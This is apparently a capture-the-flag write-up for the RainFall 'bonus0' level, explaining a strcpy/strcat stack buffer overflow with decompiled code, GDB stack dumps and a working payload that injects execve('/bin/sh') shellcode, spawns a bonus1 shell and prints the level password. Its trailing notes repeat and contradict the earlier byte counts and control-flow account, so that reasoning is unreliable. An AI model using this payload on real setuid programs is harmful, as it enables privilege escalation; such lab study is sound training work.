BONUS_0:
# 📚 Exploiting bonus0
The binary’s vulnerability lies in the pp function’s use of strcpy and strcat, which don’t check the bounds of local_3a (42 bytes in the C code). Let’s analyze how the payload exploits this:

### Running the Binary
Executing `./bonus0`:
```bash
bonus0@RainFall:~$ ./bonus0
 - 
test1
 - 
test2
test1 test2
```

- The binary prompts for two inputs, concatenates them with a space, and prints the result.

### Disassembly

#### `main` Function

```c
int main() {
  char s[42]; // [esp+16h] [ebp-2Ah]
  pp(s);
  puts(s);
  return 0;
}
```

- Allocates a 42-byte buffer `s` (`local_3a`) at `esp+0x16`.
- Calls `pp(s)` to process inputs, then `puts(s)` to print the result.
- Stack layout (from `sub $0x40, %esp` and `esp+0x16`):

  ```
  [padding (22 bytes)] [local_3a (42 bytes)] [saved EBP (4 bytes)] [return address (4 bytes)]
  ```

  - `saved EBP` at `esp+0x48`, return address at `esp+0x4c`.

#### `pp` Function

```c
char *pp(char *dest) {
  char src[20]; // [esp+28h] [ebp-30h]
  char v3[28]; // [esp+3Ch] [ebp-1Ch]
  p(src, " - ");
  p(v3, " - ");
  strcpy(dest, src);
  *(_WORD *)&dest[strlen(dest)] = unk_80486A4; // Adds space
  return strcat(dest, v3);
}
```

- Declares `src` (20 bytes) and `v3` (28 bytes, though only 20 bytes used due to `p`).
- Calls `p` to read inputs into `src` and `v3`.
- Copies `src` to `dest` (`local_3a`) with `strcpy`, adds a space, and appends `v3` with `strcat`.
- **Vulnerability**: `strcpy` and `strcat` don’t check `dest`’s 42-byte limit, allowing overflow.

#### `p` Function

```c
char *p(char *dest, char *s) {
  char buf[4104]; // [esp+10h] [ebp-1008h]
  puts(s);
  read(0, buf, 0x1000);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 0x14);
}
```

- Reads up to 4096 bytes into `buf`, terminates at newline, copies 20 bytes to `dest` (`src` or `v3`).

### Vulnerability

- **Buffer Overflow**: `strcpy(dest, src)` and `strcat(dest, v3)` can overflow `local_3a` (42 bytes).
- **Input Limit**: `strncpy` in `p` caps each input at 20 bytes, so `local_3a` gets 20 + 1 (space) + 20 = 41 bytes.
- **Impact**: Can overwrite `saved EBP` (`esp+0x48`, 42 bytes from `local_3a`) or return address (`esp+0x4c`, 46 bytes).
- **Exploitable**: NX disabled allows shellcode execution; no PIE provides stable stack addresses.

## Exploitation Strategy

1. **Place Shellcode**: Inject shellcode into `local_3a` via `src`.
2. **Overwrite saved EBP**: Use the second input to write a stack address pointing to shellcode.
3. **Redirect Execution**: Leverage `main`’s `leave` (`mov esp, ebp; pop ebp`) and `ret` to jump to shellcode.

### Stack Analysis

Using GDB to inspect the stack:

```bash
gdb-peda$ r < <(python -c 'print("A"*48 + "\n" + "C" * 24 + "B" * 8)')
```

Stack dump:

```bash
0xbfffe670: 0xbfffe680 0x0000000a 0x00001000 0x00000000
0xbfffe680: 0x41414141 0x41414141 0x41414141 0x41414141
0xbfffe690: 0x41414141 0x41414141 0x41414141 0x41414141
0xbfffe6a0: 0x41414141 0x41414141 0x41414141 0x41414141
0xbfffe6b0: 0x43434300 0x43434343 0x43434343 0x43434343
0xbfffe6c0: 0x43434343 0x43434343 0x42424243 0x42424242
0xbfffe6d0: 0x00000a42 0x00000000 0x00000000 0x00000000
```

- **Key Addresses**:
  - `local_3a` at `0xbfffe680` (contains `A`s).
  - `saved EBP` at `0xbfffe6ac` (42 bytes from `0xbfffe680`, contains `0x43434300`).
  - Return address at `0xbfffe6b0` (46 bytes, contains `0x43434343`).
  - `0xbfffe6d0` contains input data (likely shellcode).

### Working Exploit

The working payload:

```bash
(python -c 'print("\x90"*42 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'; python -c 'print("A" * 9 + "\xd0\xe6\xff\xbf" + "\x90" * 8)'; cat) | ./bonus0
```

- **First Input**: 42 NOPs + 24-byte shellcode, capped at 20 bytes (20 NOPs).

- **Second Input**: 9 `A`s + `0xbfffe6d0` + 8 NOPs, capped at 20 bytes (9 `A`s + `0xbfffe6d0` + 7 NOPs).

- **Mechanics**:

  - `local_3a` (`0xbfffe680`) gets 20 NOPs + space + 9 `A`s + `0xbfffe6d0` + 7 NOPs = 41 bytes.
  - Overwrites `saved EBP` (`0xbfffe6ac`) with `0xbfffe6d0`.
  - `leave` sets `esp` to `0xbfffe6ac`, `ret` jumps to `0xbfffe6d0`, hitting shellcode.

- **Result**: Spawns a `bonus1` shell, allowing:

  ```bash
  whoami
  bonus1
  cat /home/user/bonus1/.pass
  cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
  ```

### Why It Works

- **Vulnerability**: `strcpy` and `strcat` allow overflow of `local_3a` (42 bytes).
- **Payload**:
  - Places NOPs in `local_3a` (`0xbfffe680`).
  - Shellcode likely resides in `v3` or higher stack (`0xbfffe6d0`).
  - Overwrites `saved EBP` (`0xbfffe6ac`) with `0xbfffe6d0`.
  - `leave`/`ret` redirects to `0xbfffe6d0`, executing `execve("/bin/sh")`.
- **SUID**: Runs as `bonus1`, granting elevated shell.

```

Key Addresses:

local_3a starts at 0xbfffe680 (contains A’s from test input).
saved EBP at 0xbfffe6ac (42 bytes from 0xbfffe680, contains 0x43434300).
Return address at 0xbfffe6b0 (46 bytes from 0xbfffe680, contains 0x43434343).
0xbfffe6d0 (target address in payload) is beyond local_3a, likely where shellcode lands.



Why 42 Bytes in C Code?:

The C code shows char s[42], but main’s disassembly (sub $0x40, %esp) and esp+0x16 suggest a 42-byte buffer, confirmed by the overflow behavior.
Previous assumption of 54 bytes was incorrect, based on misaligned GDB output (0xbffff706).

How the Payload Works:

First Input: "\x90"*42 + shellcode (66 bytes, capped at 20 by strncpy).

Copies 20 NOPs to local_34, then to local_3a (0xbfffe680).


Second Input: "A" * 9 + "\xd0\xe6\xff\xbf" + "\x90" * 8 (capped at 20: A * 9 + "\xd0\xe6\xff\xbf" + "\x90" * 7).

Concatenates after a space at 0xbfffe680 + 21.


Concatenation:

local_3a: 20 NOPs + space + 9 A’s + 0xbfffe6d0 + 7 NOPs = 41 bytes.
Reaches 0xbfffe680 + 41 = 0xbfffe6a9, just before saved EBP (0xbfffe6ac).


Overflow:

The second input’s 0xbfffe6d0 overwrites saved EBP (0xbfffe6ac).
When main executes leave (mov esp, ebp; pop ebp), it sets esp to 0xbfffe6ac, then pops 0xbfffe6d0 into ebp.
The ret instruction pops the next 4 bytes (0x00000a42 at 0xbfffe6b0), causing a jump to 0x0a42 (invalid, but shellcode may execute earlier).


Shellcode Execution:

The shellcode is likely placed in local_20 (v3, 28 bytes) or further up the stack due to the large first input.
0xbfffe6d0 points to a region with NOPs and shellcode (from GDB stack: 0x00000a42 suggests input data).
The shellcode (execve("/bin/sh")) executes, spawning a bonus1 shell.

Key Observations:

The program reads two inputs (- prompts), concatenates them into local_3a (42 bytes in C code), and prints the result.
The output shows the shellcode, padding (A’s), and the address 0xbfffe6d0, followed by whoami returning bonus1, indicating a successful shell with bonus1 privileges.
The password for bonus1 is retrieved, confirming the exploit worked.



Payload Breakdown:

First Input: "\x90"*42 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

42 NOPs (\x90) + 24-byte shellcode = 66 bytes, but strncpy in p caps at 20 bytes, so only 20 bytes (e.g., 20 NOPs) are copied to local_34.


Second Input: "A" * 9 + "\xd0\xe6\xff\xbf" + "\x90" * 8

9 A’s + 4 bytes (0xbfffe6d0) + 8 NOPs = 21 bytes, capped at 20 bytes by strncpy, so likely A * 9 + "\xd0\xe6\xff\xbf" + "\x90" * 7.


Concatenation:

local_34 (20 bytes) + space (1 byte) + local_20 (20 bytes) = 41 bytes into local_3a.
```